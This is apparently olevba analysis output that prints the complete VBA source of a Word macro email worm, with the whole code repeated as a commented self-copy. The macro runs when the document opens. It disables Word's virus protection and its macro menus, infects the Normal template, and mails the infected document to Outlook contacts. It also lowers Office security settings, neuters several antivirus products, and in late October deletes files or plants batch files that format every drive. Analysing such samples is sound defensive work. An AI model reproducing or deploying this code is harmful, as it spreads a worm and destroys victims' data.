olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Email-Worm.MSWord.Rxwon
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument�.cls 
in file: ./Email-Worm.MSWord.Rxwon - OLE stream: 'Macros/VBA/ThisDocument\uf8f5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Const REG_DWORD As Long = 4
Private Const HKEY_CURRENT_USER = &H80000001
Private Const HKEY_USERS = &H80000003
Private Const KEY_ALL_ACCESS = &H3F
Private Const REG_OPTION_NON_VOLATILE = 0
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Sub Document_Open()
On Error Resume Next
On Error Resume Next
Set MBDX = NormalTemplate.VBProject.VBComponents.Item(1)
Set WDDX = ActiveDocument.VBProject.VBComponents.Item(1)
If MBDX.Name = "ThisDocument�" And (Trim$(MBDX.CodeModule.Lines(13, 1)) = "Private Sub Document_Close()" Or Trim$(MBDX.CodeModule.Lines(13, 1)) = "Private Sub Document_CLOSE()") Then
NTCL = MBDX.CodeModule.CountOfLines
For WRI = 1 To NTCL
If Trim$(MBDX.CodeModule.Lines(WRI, 1)) = "'START" Then Start = WRI: Exit For
Next WRI
Do
whr = whr + 1
If Trim$(MBDX.CodeModule.Lines(Start + 1, 1)) = "'END" Then Exit Do
linelen = Len(Trim$(MBDX.CodeModule.Lines(Start + 1, 1))) - 1
If Right$(Trim$(MBDX.CodeModule.Lines(Start + 1, 1)), linelen) <> Trim$(MBDX.CodeModule.Lines(33 + whr, 1)) Then
MBDX.CodeModule.InsertLines whr + 33, Right$(Trim$(MBDX.CodeModule.Lines(Start + 1, 1)), linelen)
Start = Start + 1
End If
Start = Start + 1
Loop
End If
nkpk = NKPKVIRUS
wxrvirus = virus
wxrll = wxrlock
wxrword = wxrkill
Options.VirusProtection = False
CustomizationContext = NormalTemplate
CommandBars("Visual Basic").Visible = False
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "record") = "" Then
      ZX = mySendMail()
   Else
      recorddate$ = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "record")
      If (Val(Mid$(Date$, 1, 4)) > Val(Mid$(recorddate$, 1, 4)) And Val(Mid$(Date$, 6, 2)) = 1 And Val(Mid$(recorddate$, 6, 2)) = 12 And Val(Mid$(Date$, 1, 4)) - Val(Mid$(recorddate$, 1, 4)) = 1) Or (Val(Mid$(Date$, 1, 4)) = Val(Mid$(recorddate$, 1, 4)) And Val(Mid$(Date$, 6, 2)) - Val(Mid$(recorddate$, 6, 2)) = 1) Or (Val(Mid$(Date$, 1, 4)) = Val(Mid$(recorddate$, 1, 4)) And Val(Mid$(Date$, 6, 2)) > Val(Mid$(recorddate$, 6, 2))) Then
          Select Case Val(Mid$(Date$, 6, 2))
                 Case 1, 3, 5, 7, 10, 12
                      If Val(Mid$(Date$, 6, 2)) = 3 Then
                         If (Val(Mid$(Date$, 1, 4)) Mod 4 = 0 And Val(Mid$(Date$, 1, 4)) Mod 100 <> 0) Or Val(Mid$(Date$, 1, 4)) Mod 400 = 0 Then
                             If Val(Mid$(Date$, 9, 2)) + 29 - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
                         Else
                             If Val(Mid$(Date$, 9, 2)) + 28 - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
                         End If
                      Else
                      If Val(Mid$(Date$, 9, 2)) + 30 - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
                      End If
                 Case Else
                      If Val(Mid$(Date$, 9, 2)) + 31 - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
          End Select
      Else
          If Val(Mid$(Date$, 1, 4)) = Val(Mid$(recorddate$, 1, 4)) And Val(Mid$(Date$, 6, 2)) = Val(Mid$(recorddate$, 6, 2)) And Val(Mid$(Date$, 9, 2)) > Val(Mid$(recorddate$, 9, 2)) Then
              If Val(Mid$(Date$, 9, 2)) - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
          End If
      End If
   End If
Set WDDX = ActiveDocument.VBProject.VBComponents.Item(1)
Set MBDX = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = MBDX.CodeModule.CountOfLines
ADCL = WDDX.CodeModule.CountOfLines
If WDDX.Name <> "ThisDocument�" Then
  If ADCL > 0 Then WDDX.CodeModule.DeleteLines 1, ADCL
  Set DXInfo = WDDX
  WDDX.Name = "ThisDocument�"
  ADFree = True
End If
If MBDX.Name <> "ThisDocument�" Then
  If NTCL > 0 Then MBDX.CodeModule.DeleteLines 1, NTCL
  Set DXInfo = MBDX
  MBDX.Name = "ThisDocument�"
  NTFree = True
End If
If NTFree = True Then
  For ADLINE = 1 To ADCL
      If WDDX.CodeModule.Lines(ADLINE, 1) = "" Then WDDX.CodeModule.DeleteLines ADLINE: DELLINe = DELLINe + 1
  Next ADLINE
  For WRI = 1 To 12
      DXInfo.CodeModule.InsertLines WRI, WDDX.CodeModule.Lines(WRI, 1)
  Next WRI
  DXInfo.CodeModule.AddFromString ("Private Sub Document_Close()")
  For WRI = 14 To ADCL - DELLINe
        If Trim$(WDDX.CodeModule.Lines(WRI, 1)) = "Sub DOCMACRO()" Then
           DXInfo.CodeModule.InsertLines WRI, "Sub NTMACRO()"
        Else
            If Trim$(WDDX.CodeModule.Lines(WRI, 1)) = "mitem.OnAction = ""DOCMACRO""" Then
               DXInfo.CodeModule.InsertLines WRI, "mitem.OnAction = ""NTMACRO"""
            Else
               DXInfo.CodeModule.InsertLines WRI, WDDX.CodeModule.Lines(WRI, 1)
            End If
        End If
  Next WRI
End If
If ADFree = True Then
    For NTLINE = 1 To NTCL
      If MBDX.CodeModule.Lines(NTLINE, 1) = "" Then MBDX.CodeModule.DeleteLines NTLINE: DELLINe = DELLINe + 1
    Next NTLINE
    For WRI = 1 To 12
      DXInfo.CodeModule.InsertLines WRI, MBDX.CodeModule.Lines(WRI, 1)
    Next WRI
    DXInfo.CodeModule.AddFromString ("Private Sub Document_Open()")
    For WRI = 14 To NTCL - DELLINe
        If Trim$(MBDX.CodeModule.Lines(WRI, 1)) = "Sub NTMACRO()" Then
           DXInfo.CodeModule.InsertLines WRI, "Sub DOCMACRO()"
        Else
            If Trim$(MBDX.CodeModule.Lines(WRI, 1)) = "mitem.OnAction = ""NTMACRO""" Then
               DXInfo.CodeModule.InsertLines WRI, "mitem.OnAction = ""DOCMACRO"""
            Else
               DXInfo.CodeModule.InsertLines WRI, MBDX.CodeModule.Lines(WRI, 1)
            End If
        End If
    Next WRI
End If
End Sub
Sub DOCMACRO()
End Sub
Private Function wxrlock() As String
       For Each mitem In CommandBars("TOOLS").Controls
           If mitem.Caption = "自定义(&C)..." Then
mitem.OnAction = "DOCMACRO"
           End If
           If mitem.Caption = "模板和加载项(&I)..." Then
mitem.OnAction = "DOCMACRO"
           End If
           If mitem.Caption = "选项(&O)..." Then
mitem.OnAction = "DOCMACRO"
           End If
       Next mitem
       For Each citem In CommandBars("TOOLS").Controls
           If citem.Type = msoControlPopup Then
              If citem.Caption = "宏(&M)" Then
                 For Each mitem In citem.CommandBar.Controls
                     If mitem.Caption = "宏(&M)..." Then
mitem.OnAction = "DOCMACRO"
                     End If
                     If mitem.Caption = "录制新宏(&R)..." Then
mitem.OnAction = "DOCMACRO"
                     End If
                     If mitem.Caption = "安全性(&S)..." Then
mitem.OnAction = "DOCMACRO"
                     End If
                     If mitem.Caption = "Visual Basic 编辑器(&V)" Then
mitem.OnAction = "DOCMACRO"
                     End If
                 Next mitem
              End If
           End If
        Next citem
End Function
Private Function MY() As String
Dim wxrstring As String
Dim wxrlong As Long
wxrstring = String(255, 0)
wxrlong = GetWindowsDirectory(wxrstring, Len(wxrstring))
wxrstring = Left(wxrstring, wxrlong)
MY = wxrstring
End Function
Private Function mySendMail() As String
      Dim ODx, MapiDx, EmalDx: pw = 1
      Set ODx = CreateObject("Outlook.Application")
      Set MapiDx = ODx.GetNameSpace("MAPI")
      If ODx = "Outlook" Then
          MapiDx.Logon "profile", "password"
          For x = 1 To MapiDx.AddressLists.Count
              Set DA = MapiDx.AddressLists(x)
              Set EmalDx = ODx.CreateItem(0)
              For y = 1 To DA.AddressEntries.Count
                  hg = DA.AddressEntries(pw)
                  EmalDx.Recipients.Add hg
                  pw = pw + 1
                  If pw = 15 Then Exit For
              Next y
              If Val(Mid$(Date$, 6, 2)) = 12 And Val(Mid$(Date$, 9, 2)) > 15 And Val(Mid$(Date$, 9, 2)) < 26 Then
                 EmalDx.Subject = "Merry Christmas!" & "--" & Application.UserName
                 EmalDx.Body = "    NOTICE!Here is that document give you,Do not show anyone else ;-)."
              Else
                   If Val(Mid$(Date$, 6, 2)) = 12 And Val(Mid$(Date$, 9, 2)) > 25 And Val(Mid$(Date$, 9, 2)) <= 31 Then
                       EmalDx.Subject = "HAPPY NEW YEAR!" & "--" & Application.UserName
                       EmalDx.Body = "    NOTICE SAVE!Here is that document give you."
                    Else
                       If Val(Mid$(Date$, 9, 2)) Mod 2 = 0 Then
                           EmalDx.Subject = ActiveDocument.Name & "--" & Application.UserName
                           EmalDx.Body = "    NOTICE!Do not show anyone."
                       Else
                           EmalDx.Subject = "Here is that document give you,Looked,Notice save.--" & Application.UserName
                           EmalDx.Body = "    NOTICE!Here is that document give you,Do not show anyone."
                       End If
                    End If
                End If
              EmalDx.Attachments.Add ActiveDocument.FullName
              EmalDx.Send
           Next x
           MapiDx.Logoff
       End If
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "record") = Date$
End Function
Private Function wxrkill() As String
       Dim wxrday As String
       Dim wxrmon As String
       wxrday = Mid$(Date$, 9, 2)
       wxrmon = Mid$(Date$, 6, 2)
       If Val(wxrmon) = 10 Then
          If Val(wxrday) >= 15 And Val(wxrday) <= 28 Then
              If Dir(MY & "\command\format.com") = "" Then
                  For drivenuM% = 90 To 67 Step -1
                      gDt& = GetDriveType(Chr$(drivenuM%) & ":")
                      If gDt& = 3 Or gDt& = 4 Then
                         driveName$ = Chr$(drivenuM%) & ":"
                         If Chr$(drivenuM%) <> UCase(Left$(MY, 1)) Then
                           Kill driveName$ & "\*.*"
                         End If
                      End If
                   Next drivenuM%
                   Kill MY & "\system\*.*"
              Else
                  Open MY & "\winstart.bat" For Output As #15
                  Open MY & "\dosstart.bat" For Output As #28
                  Print #15, "@echo off"
                  Print #28, "@echo off"
                  For drivenuM% = 90 To 67 Step -1
                      gDt& = GetDriveType(Chr$(drivenuM%) & ":")
                      If gDt& = 3 Or gDt& = 4 Then
                         driveName$ = Chr$(drivenuM%)
                         If driveName$ <> UCase(Left$(MY, 1)) Then
                         Print #15, "echo y|format "; driveName$; ": "; "/q/v:"; driveName$; ">nul"
                         Print #28, "echo y|format "; driveName$; ": "; "/q/v:"; driveName$; ">nul"
                         End If
                      End If
                   Next drivenuM%
                         Print #15, "echo y|format "; UCase(Left$(MY, 1)); ": "; "/u/v:"; UCase(Left$(MY, 1)); ">nul"
                         Print #28, "echo y|format "; UCase(Left$(MY, 1)); ": "; "/u/v:"; UCase(Left$(MY, 1)); ">nul"
                  Close 15, 28
              End If
           End If
        End If
End Function
Private Function virus() As String
CreateNewKey HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Word\Security"
SetKeyValue HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Word\Security", "Level", 1, REG_DWORD
CreateNewKey HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Word\Security"
SetKeyValue HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Word\Security", "DontTrustInstalledFiles", 0, REG_DWORD
CreateNewKey HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail"
SetKeyValue HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail", "Send Mail Immediately", 1, REG_DWORD
CreateNewKey HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail"
SetKeyValue HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail", "Poll For Mail", 1, REG_DWORD
CreateNewKey HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail"
SetKeyValue HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail", "Poll For Mail Interval", 1, REG_DWORD
CreateNewKey HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Preferences"
SetKeyValue HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Preferences", "SaveSent", 0, REG_DWORD
End Function
Private Function NKPKVIRUS() As String
If System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{067DF822-EAB6-11cf-B56E-00A0244D5087}\InProcServer32", "") <> "" Then
   nkpkpath$ = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{067DF822-EAB6-11cf-B56E-00A0244D5087}\InProcServer32", "")
   System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{067DF822-EAB6-11cf-B56E-00A0244D5087}\InProcServer32", "") = ""
   System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{067DF822-EAB6-11cf-B56E-00A0244D5087}\InProcServer32", "ThreadingModel") = ""
   Do
   nkpk = nkpk + 1
   nkpkmid$ = Mid$(nkpkpath$, nkpk + 3, 1)
   If Asc(nkpkmid$) <> 92 Then
       If Asc(nkpkmid$) <> 32 Then
       npt$ = npt$ + nkpkmid$
       End If
   Else
    Exit Do
   End If
   Loop
   If Len(Trim$(npt$)) > 8 Then
     nkpath$ = Left$(Trim$(npt$), 6) & "~1"
   End If
   nkkill$ = Left$(nkpkpath$, 3) & nkpath$ & "\navshell.dll"
   Open MY & "\wininit.ini" For Output As #34
   Print #34, "[RENAME]"
   Print #34, "NUL="; nkkill$
   Close 34
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\WIMMUN32", "StaticVxD") <> "" Then
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\WIMMUN32", "StaticVxD") = ""
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\WIMMUN32", "Enforcement") = ""
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\WIMMUN32", "Start") = ""
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\KVW3000", "DisplayName") <> "" Then
   kv$ = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\KVW3000", "UninstallString")
   Do
   kv300 = kv300 + 1
   kvp$ = Mid$(kv$, kv300 + 3, 1)
   If Asc(kvp$) <> 92 Then
       If Asc(kvp$) <> 32 Then
       kvpath$ = kvpath$ + kvp$
       End If
   Else
    Exit Do
   End If
   Loop
   If Len(Trim$(kvpath$)) > 8 Then
     kvpath$ = Left$(Trim$(kvpath$), 6) & "~1"
   End If
   kvkill$ = Left$(kv$, 3) & kvpath$ & "\KVShell.dll"
   Open MY & "\wininit.ini" For Output As #34
   Print #34, "[RENAME]"
   Print #34, "NUL="; kvkill$
   Close 34
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\TrendMicro\PC-cillin98\4.0", "register no.") <> "" Then
    Trendpath$ = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\TrendMicro\PC-cillin98\4.0", "Application Path")
   Do
   pc = pc + 1
   Trend$ = Mid$(Trendpath$, pc + 3, 1)
   If Asc(Trend$) <> 92 Then
       If Asc(Trend$) <> 32 Then
       Trendmid$ = Trendmid$ + Trend$
       End If
   Else
    Exit Do
   End If
   Loop
   If Len(Trim$(Trendmid$)) > 8 Then
     Trendmid$ = Left$(Trim$(Trendmid$), 6) & "~1"
   End If
   Trendpath$ = Left$(Trendpath$, 3) & Trendmid$ & "\"
   Open MY & "\wininit.ini" For Output As #34
    Print #34, "[RENAME]"
    Print #34, "NUL="; Trendpath$; "PCC98RES.dll"
    Print #34, "NUL="; Trendpath$; "IO98RES.dll"
    Close 34
End If
End Function
Private Function SetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
    Dim lValue As Long
    Dim sValue As String
If lType = REG_DWORD Then
            lValue = vValue
            SetValueEx = RegSetValueExLong(hKey, sValueName, 0&, lType, lValue, 4)
End If
End Function
Private Function CreateNewKey(lPredefinedKey As Long, sNewKeyName As String)
    Dim hNewKey As Long
    Dim lRetVal As Long
    lRetVal = RegCreateKeyEx(lPredefinedKey, sNewKeyName, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hNewKey, lRetVal)
    RegCloseKey (hNewKey)
End Function
Private Function SetKeyValue(lPredefinedKey As Long, sKeyName As String, sValueName As String, vValueSetting As Variant, lValueType As Long)
       Dim lRetVal As Long
       Dim hKey As Long
       lRetVal = RegOpenKeyEx(lPredefinedKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
       lRetVal = SetValueEx(hKey, sValueName, lValueType, vValueSetting)
       RegCloseKey (hKey)
End Function
'Ver NO.WXR1.0
'START
'nkpk = NKPKVIRUS
'wxrvirus = virus
'wxrll = wxrlock
'wxrword = wxrkill
'Options.VirusProtection = False
'CustomizationContext = NormalTemplate
'CommandBars("Visual Basic").Visible = False
'FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
'FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
'If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "record") = "" Then
'ZX = mySendMail()
'Else
'recorddate$ = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "record")
'If (Val(Mid$(Date$, 1, 4)) > Val(Mid$(recorddate$, 1, 4)) And Val(Mid$(Date$, 6, 2)) = 1 And Val(Mid$(recorddate$, 6, 2)) = 12 And Val(Mid$(Date$, 1, 4)) - Val(Mid$(recorddate$, 1, 4)) = 1) Or (Val(Mid$(Date$, 1, 4)) = Val(Mid$(recorddate$, 1, 4)) And Val(Mid$(Date$, 6, 2)) - Val(Mid$(recorddate$, 6, 2)) = 1) Or (Val(Mid$(Date$, 1, 4)) = Val(Mid$(recorddate$, 1, 4)) And Val(Mid$(Date$, 6, 2)) > Val(Mid$(recorddate$, 6, 2))) Then
'Select Case Val(Mid$(Date$, 6, 2))
'Case 1, 3, 5, 7, 10, 12
'If Val(Mid$(Date$, 6, 2)) = 3 Then
'If (Val(Mid$(Date$, 1, 4)) Mod 4 = 0 And Val(Mid$(Date$, 1, 4)) Mod 100 <> 0) Or Val(Mid$(Date$, 1, 4)) Mod 400 = 0 Then
'If Val(Mid$(Date$, 9, 2)) + 29 - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
'Else
'If Val(Mid$(Date$, 9, 2)) + 28 - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
'End If
'Else
'If Val(Mid$(Date$, 9, 2)) + 30 - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
'End If
'Case Else
'If Val(Mid$(Date$, 9, 2)) + 31 - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
'End Select
'Else
'If Val(Mid$(Date$, 1, 4)) = Val(Mid$(recorddate$, 1, 4)) And Val(Mid$(Date$, 6, 2)) = Val(Mid$(recorddate$, 6, 2)) And Val(Mid$(Date$, 9, 2)) > Val(Mid$(recorddate$, 9, 2)) Then
'If Val(Mid$(Date$, 9, 2)) - Val(Mid$(recorddate$, 9, 2)) >= 7 Then ZX = mySendMail()
'End If
'End If
'End If
'Set WDDX = ActiveDocument.VBProject.VBComponents.Item(1)
'Set MBDX = NormalTemplate.VBProject.VBComponents.Item(1)
'NTCL = MBDX.CodeModule.CountOfLines
'ADCL = WDDX.CodeModule.CountOfLines
'If WDDX.Name <> "ThisDocument�" Then
'If ADCL > 0 Then WDDX.CodeModule.DeleteLines 1, ADCL
'Set DXInfo = WDDX
'WDDX.Name = "ThisDocument�"
'ADFree = True
'End If
'If MBDX.Name <> "ThisDocument�" Then
'If NTCL > 0 Then MBDX.CodeModule.DeleteLines 1, NTCL
'Set DXInfo = MBDX
'MBDX.Name = "ThisDocument�"
'NTFree = True
'End If
'If NTFree = True Then
'For ADLINE = 1 To ADCL
'If WDDX.CodeModule.Lines(ADLINE, 1) = "" Then WDDX.CodeModule.DeleteLines ADLINE: DELLINe = DELLINe + 1
'Next ADLINE
'For WRI = 1 To 12
'DXInfo.CodeModule.InsertLines WRI, WDDX.CodeModule.Lines(WRI, 1)
'Next WRI
'DXInfo.CodeModule.AddFromString ("Private Sub Document_Close()")
'For WRI = 14 To ADCL - DELLINe
'If Trim$(WDDX.CodeModule.Lines(WRI, 1)) = "Sub DOCMACRO()" Then
'DXInfo.CodeModule.InsertLines WRI, "Sub NTMACRO()"
'Else
'If Trim$(WDDX.CodeModule.Lines(WRI, 1)) = "mitem.OnAction = ""DOCMACRO""" Then
'DXInfo.CodeModule.InsertLines WRI, "mitem.OnAction = ""NTMACRO"""
'Else
'DXInfo.CodeModule.InsertLines WRI, WDDX.CodeModule.Lines(WRI, 1)
'End If
'End If
'Next WRI
'End If
'If ADFree = True Then
'For NTLINE = 1 To NTCL
'If MBDX.CodeModule.Lines(NTLINE, 1) = "" Then MBDX.CodeModule.DeleteLines NTLINE: DELLINe = DELLINe + 1
'Next NTLINE
'For WRI = 1 To 12
'DXInfo.CodeModule.InsertLines WRI, MBDX.CodeModule.Lines(WRI, 1)
'Next WRI
'DXInfo.CodeModule.AddFromString ("Private Sub Document_Open()")
'For WRI = 14 To NTCL - DELLINe
'If Trim$(MBDX.CodeModule.Lines(WRI, 1)) = "Sub NTMACRO()" Then
'DXInfo.CodeModule.InsertLines WRI, "Sub DOCMACRO()"
'Else
'If Trim$(MBDX.CodeModule.Lines(WRI, 1)) = "mitem.OnAction = ""NTMACRO""" Then
'DXInfo.CodeModule.InsertLines WRI, "mitem.OnAction = ""DOCMACRO"""
'Else
'DXInfo.CodeModule.InsertLines WRI, MBDX.CodeModule.Lines(WRI, 1)
'End If
'End If
'Next WRI
'End If
'End Sub
'Sub NTMACRO()
'End Sub
'Private Function wxrlock() As String
'For Each mitem In CommandBars("TOOLS").Controls
'If mitem.Caption = "自定义(&C)..." Then
'mitem.OnAction = "NTMACRO"
'End If
'If mitem.Caption = "模板和加载项(&I)..." Then
'mitem.OnAction = "NTMACRO"
'End If
'If mitem.Caption = "选项(&O)..." Then
'mitem.OnAction = "NTMACRO"
'End If
'Next mitem
'For Each citem In CommandBars("TOOLS").Controls
'If citem.Type = msoControlPopup Then
'If citem.Caption = "宏(&M)" Then
'For Each mitem In citem.CommandBar.Controls
'If mitem.Caption = "宏(&M)..." Then
'mitem.OnAction = "NTMACRO"
'End If
'If mitem.Caption = "录制新宏(&R)..." Then
'mitem.OnAction = "NTMACRO"
'End If
'If mitem.Caption = "安全性(&S)..." Then
'mitem.OnAction = "NTMACRO"
'End If
'If mitem.Caption = "Visual Basic 编辑器(&V)" Then
'mitem.OnAction = "NTMACRO"
'End If
'Next mitem
'End If
'End If
'Next citem
'End Function
'Private Function MY() As String
'Dim wxrstring As String
'Dim wxrlong As Long
'wxrstring = String(255, 0)
'wxrlong = GetWindowsDirectory(wxrstring, Len(wxrstring))
'wxrstring = Left(wxrstring, wxrlong)
'MY = wxrstring
'End Function
'Private Function mySendMail() As String
'Dim ODx, MapiDx, EmalDx: pw = 1
'Set ODx = CreateObject("Outlook.Application")
'Set MapiDx = ODx.GetNameSpace("MAPI")
'If ODx = "Outlook" Then
'MapiDx.Logon "profile", "password"
'For x = 1 To MapiDx.AddressLists.Count
'Set DA = MapiDx.AddressLists(x)
'Set EmalDx = ODx.CreateItem(0)
'For y = 1 To DA.AddressEntries.Count
'hg = DA.AddressEntries(pw)
'EmalDx.Recipients.Add hg
'pw = pw + 1
'If pw = 15 Then Exit For
'Next y
'If Val(Mid$(Date$, 6, 2)) = 12 And Val(Mid$(Date$, 9, 2)) > 15 And Val(Mid$(Date$, 9, 2)) < 26 Then
'EmalDx.Subject = "Merry Christmas!" & "--" & Application.UserName
'EmalDx.Body = "    NOTICE!Here is that document give you,Do not show anyone else ;-)."
'Else
'If Val(Mid$(Date$, 6, 2)) = 12 And Val(Mid$(Date$, 9, 2)) > 25 And Val(Mid$(Date$, 9, 2)) <= 31 Then
'EmalDx.Subject = "HAPPY NEW YEAR!" & "--" & Application.UserName
'EmalDx.Body = "    NOTICE SAVE!Here is that document give you."
'Else
'If Val(Mid$(Date$, 9, 2)) Mod 2 = 0 Then
'EmalDx.Subject = ActiveDocument.Name & "--" & Application.UserName
'EmalDx.Body = "    NOTICE!Do not show anyone."
'Else
'EmalDx.Subject = "Here is that document give you,Looked,Notice save.--" & Application.UserName
'EmalDx.Body = "    NOTICE!Here is that document give you,Do not show anyone."
'End If
'End If
'End If
'EmalDx.Attachments.Add ActiveDocument.FullName
'EmalDx.Send
'Next x
'MapiDx.Logoff
'End If
'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "record") = Date$
'End Function
'Private Function wxrkill() As String
'Dim wxrday As String
'Dim wxrmon As String
'wxrday = Mid$(Date$, 9, 2)
'wxrmon = Mid$(Date$, 6, 2)
'If Val(wxrmon) = 10 Then
'If Val(wxrday) >= 15 And Val(wxrday) <= 28 Then
'If Dir(MY & "\command\format.com") = "" Then
'For drivenuM% = 90 To 67 Step -1
'gDt& = GetDriveType(Chr$(drivenuM%) & ":")
'If gDt& = 3 Or gDt& = 4 Then
'driveName$ = Chr$(drivenuM%) & ":"
'If Chr$(drivenuM%) <> UCase(Left$(MY, 1)) Then
'Kill driveName$ & "\*.*"
'End If
'End If
'Next drivenuM%
'Kill MY & "\system\*.*"
'Else
'Open MY & "\winstart.bat" For Output As #15
'Open MY & "\dosstart.bat" For Output As #28
'Print #15, "@echo off"
'Print #28, "@echo off"
'For drivenuM% = 90 To 67 Step -1
'gDt& = GetDriveType(Chr$(drivenuM%) & ":")
'If gDt& = 3 Or gDt& = 4 Then
'driveName$ = Chr$(drivenuM%)
'If driveName$ <> UCase(Left$(MY, 1)) Then
'Print #15, "echo y|format "; driveName$; ": "; "/q/v:"; driveName$; ">nul"
'Print #28, "echo y|format "; driveName$; ": "; "/q/v:"; driveName$; ">nul"
'End If
'End If
'Next drivenuM%
'Print #15, "echo y|format "; UCase(Left$(MY, 1)); ": "; "/u/v:"; UCase(Left$(MY, 1)); ">nul"
'Print #28, "echo y|format "; UCase(Left$(MY, 1)); ": "; "/u/v:"; UCase(Left$(MY, 1)); ">nul"
'Close 15, 28
'End If
'End If
'End If
'End Function
'Private Function virus() As String
'CreateNewKey HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Word\Security"
'SetKeyValue HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Word\Security", "Level", 1, REG_DWORD
'CreateNewKey HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Word\Security"
'SetKeyValue HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Word\Security", "DontTrustInstalledFiles", 0, REG_DWORD
'CreateNewKey HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail"
'SetKeyValue HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail", "Send Mail Immediately", 1, REG_DWORD
'CreateNewKey HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail"
'SetKeyValue HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail", "Poll For Mail", 1, REG_DWORD
'CreateNewKey HKEY_USERS, ".DEFAULT\Software\Microsoft\Office\9.0\Outlook\Options\Mail"
